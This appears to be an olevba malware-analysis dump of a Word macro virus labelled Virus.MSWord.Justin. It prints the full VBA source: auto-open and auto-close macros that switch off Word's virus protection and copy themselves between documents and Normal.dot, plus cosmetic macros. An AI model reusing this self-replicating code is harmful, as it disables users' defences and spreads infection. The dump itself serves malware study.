olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Justin
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Justin - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Justin - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoopen()
Attribute autoopen.VB_Description = "Macro gravada 28/07/99 por Fernando Dias"
Attribute autoopen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.Macro1"
' Macro1 Macro
' Macro gravada 28/07/99 por junior santin
' Quando o documento é aberto, é copiado automaticamente
' o modulo do documento ativo p/ o normal.dot
Options.VirusProtection = False
ShowVisualBasicEditor = False
On Error GoTo saida
    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
saida:
End Sub
Sub autoclose()
'Quando o documento é fechado é copiado automaticamente
'o modulo do normal.dot p/ o documento
On Error GoTo saida
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:= _
        ActiveDocument.FullName, Name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
saida:
End Sub



Sub imprimir()
Attribute imprimir.VB_Description = "Macro gravada 31/12/99 por Fernando Dias"
Attribute imprimir.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.imprimir"
'
' imprimir Macro
' Macro gravada 31/12/99 por Fernando Dias
'
    ActiveDocument.PrintOut
End Sub
Sub Macro1()
Attribute Macro1.VB_Description = "Macro gravada 11/09/99 por Fernando Dias"
Attribute Macro1.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Macro1"
'
' Macro1 Macro
' Macro gravada 11/09/99 por Fernando Dias
'
    Selection.TypeText Text:="junior santin"
    Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
    Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
    With Selection.Font
        .Name = "Times New Roman"
        .Size = 20
        .Bold = True
        .Italic = False
        .Underline = wdUnderlineNone
        .StrikeThrough = False
        .DoubleStrikeThrough = False
        .Outline = False
        .Emboss = False
        .Shadow = False
        .Hidden = False
        .SmallCaps = False
        .AllCaps = False
        .ColorIndex = wdBlue
        .Engrave = False
        .Superscript = False
        .Subscript = False
        .Spacing = 0
        .Scaling = 100
        .Position = 0
        .Kerning = 0
        .Animation = wdAnimationNone
    End With
End Sub
Sub Macro2()
Attribute Macro2.VB_Description = "Macro gravada 11/09/99 por Fernando Dias"
Attribute Macro2.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Macro2"
'
' Macro2 Macro
' Macro gravada 11/09/99 por Fernando Dias
'
    Selection.WholeStory
    Selection.Font.ColorIndex = wdRed
    Selection.Font.Size = 14
    Selection.Font.Name = "Arial"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
+----------+--------------------+---------------------------------------------+

